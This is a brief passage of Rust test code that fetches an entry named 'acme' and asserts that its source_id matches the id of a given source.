        .entry("acme")
        .unwrap();
    assert_eq!(entry.source_id.as_deref(), Some(source.id.as_str()));
}
